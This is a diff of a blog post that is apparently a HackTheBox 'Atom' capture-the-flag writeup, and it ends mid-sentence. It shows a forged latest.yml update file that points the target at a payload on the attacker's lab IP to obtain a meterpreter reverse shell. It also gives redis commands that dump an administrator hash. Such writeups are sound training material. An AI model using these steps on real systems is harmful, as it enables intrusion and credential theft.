@@ -4,7 +4,7 @@ date: 2021-05-08 09:45:47 +07:00
 categories: ctf
 #modified: 20-08-29 09:24:47 +07:00
 #tags: [blog, netlify, jekyll, github]
-description: HackTheBox Atom in depth Writeup.
+description: HackTheBox Atom Writeup.
 ---
 
 <h1 align="center"> HTB Atom - Writeup - May 8 2021</h1>
@@ -15,7 +15,7 @@ description: HackTheBox Atom in depth Writeup.
 
 <hr>
 
-Hello All! Its me **mercer98** back with another one .
+Its me **m3rcer** back with another one .
 This is a fun little box w a medium difficulty. There's a few rabbit holes but other than that its quite straightforward . In my opinion i found the privesc a bit harder than the inital foothold . 
 
 *[Find the official link for HacktheBox - Atom here!](https://app.hackthebox.eu/machines/340)*
@@ -24,6 +24,7 @@ Lets Begin!
 
 <hr>
 
+----------------------------------------------------------------------------------------------------
 
 ### ENUMERATION
 
@@ -78,6 +79,7 @@ The exploit bypasses inbuilt signature checks.
 ![Image](images/atom6.png)
 
 
+----------------------------------------------------------------------------------------------------
 
 ### FOOTHOLD
 
@@ -87,7 +89,7 @@ The exploit bypasses inbuilt signature checks.
 
 ![Image](images/atom8.png)
 
-I renamed the file to d'payload.exe
+- I renamed the file to d'payload.exe
 
 ![Image](images/atom10.png)
 
@@ -95,17 +97,18 @@ I renamed the file to d'payload.exe
 
 ![Image](images/atom9.png)
 
+
 - Setup a listener on msfconsole to catch your shell using multi/handler.
 
-- generate the latest.yml file update: Replace the path and the hash.
+- Generate the latest.yml file update: Replace the path and the hash.
+
 ```
 version: 1.2.3
 path: http://10.10.14.52/d'payload.exe 
 sha512: a/xp95BNvRKGxbxRZv+1LOEIs9uaSX6wGz6ip+RDX2XjNkTFVJbwIZ9T21SN40sq/78zYZmb9IxATX710s58Rg==
 ```
 
-- Start a server to host d'payload.exe using 
-`sudo python -m SimpleHTTPServer 80`
+- Start a server to host d'payload.exe using: `sudo python -m SimpleHTTPServer 80`
 
 - Finally put the update file in one of the client folders on the share using smbclient.
 Wait for about 15-20 secs and let the update happen . You will recieve a meterpreter shell!
@@ -114,8 +117,8 @@ Wait for about 15-20 secs and let the update happen . You will recieve a meterpr
 
 Congrats We now have a reverse shell. 
 
-A getuid command shows we are ATOM\jason
-Great!
+- A getuid command shows we are ATOM\jason
+Awesome!
 
 ***GETTING USER.txt***
 
@@ -123,7 +126,7 @@ __C:\Users\jason\Desktop\user.txt__
 
 Retrieve contents of the file to see your flag!
 
-
+----------------------------------------------------------------------------------------------------
 
 ### PRIVESC:
 
@@ -137,8 +140,10 @@ Run it...
 
 Details found :
 
-- jasons creds :
+- Jasons creds :
+
 ![Image](images/atom13.jpg)
+
 Dosent allow winrm remoting but...
 
 - A user guide pdf which we might have a look at if needed .... 
@@ -150,7 +155,7 @@ Dosent allow winrm remoting but...
 
 ![Image](images/atom14.png)
 
-We found the pass for redis. 
+- We found the pass for redis. 
 
 ![Image](images/atom15.jpg)
 
@@ -164,25 +169,35 @@ Use this [link](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) as
 Now follow the steps:
 
 - Connect to redis using:
+
 `redis -h 10.10.10.237`
 
+
 - Authenticate using the password:
+
 `auth pass`
 
+
 - Retrive info on the keyspace using:
+
 `info keyspace`
+
 
 - We see that there is one db - number 0 which has 4 keys.
 View the keys by:
+
 `keys *`
 
+
 - We see a bunch of keys . Retrieve the first or last , it might most likely be the administrator using:
+
 `get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0`
+
 
 ![Image](images/atom16.jpg)
 
 
-- we now have the administrator hash ! Hurray!
+- We now have the administrator hash ! RightOn!
 
 
 Ater looking a lot on how to decrypt the hash i decided to look back at the "User guide.pdf" to look for clues and i found :
